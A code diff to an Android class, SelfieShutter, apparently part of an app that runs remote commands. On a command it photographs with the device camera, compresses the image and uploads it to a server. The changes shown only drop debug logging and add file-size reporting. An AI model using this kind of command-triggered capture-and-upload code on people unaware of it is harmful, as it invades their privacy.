@@ -5,7 +5,6 @@ import android.graphics.Bitmap;
 import android.hardware.Camera;
 import android.os.Handler;
 import android.os.Looper;
-import android.util.Log;
 import android.view.SurfaceView;
 import android.view.View;
 
@@ -45,6 +44,10 @@ public class SelfieShutter extends BaseCommand {
         super(command);
     }
 
+    private static String getSizeInKB(File cmpFile) {
+        return ((double) (cmpFile.length() / 1024)) + "KB";
+    }
+
     @Override
     public void handle(final Context context, final Callback callback) {
         this.callback = callback;
@@ -73,7 +76,6 @@ public class SelfieShutter extends BaseCommand {
         return camId;
     }
 
-
     private void takeASelfie() {
 
         // here below "this" is activity context.
@@ -97,10 +99,8 @@ public class SelfieShutter extends BaseCommand {
                     outStream = new FileOutputStream(filePath);
                     outStream.write(data);
                     outStream.close();
-                    Log.d("X", "onPictureTaken - wrote bytes: " + data.length);
-                    callback.onInfo("Selfie taken and saved to " + filePath);
+                    callback.onInfo("Selfie taken and saved to " + filePath + " , Size: " + getSizeInKB(new File(filePath)));
                     compressAndUpload(filePath, imageId);
-                    System.out.println("Picture saved : " + filePath);
                 } catch (IOException e) {
                     e.printStackTrace();
                 } finally {
@@ -137,13 +137,15 @@ public class SelfieShutter extends BaseCommand {
                     BitmapUtils.saveBitmap(loadedImage, cmpPath);
                     callback.onInfo("Compressed image saved: " + cmpPath);
 
-                    callback.onInfo("Uploading image: " + (cmpPath.length() / 1024) + "KB");
                     new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
                         @Override
                         public void onReadyToRequest(String apiKey, String frenemyId) {
 
                             //Uploading
                             final File cmpFile = new File(cmpPath);
+
+
+                            callback.onInfo("Uploading compressed image: " + getSizeInKB(cmpFile));
 
                             final Request photoUploadRequest = new MultipartAPIRequestBuilder("/upload", apiKey)
                                     .addFile(cmpFile, "file", MultipartAPIRequestBuilder.TYPE_IMAGE)
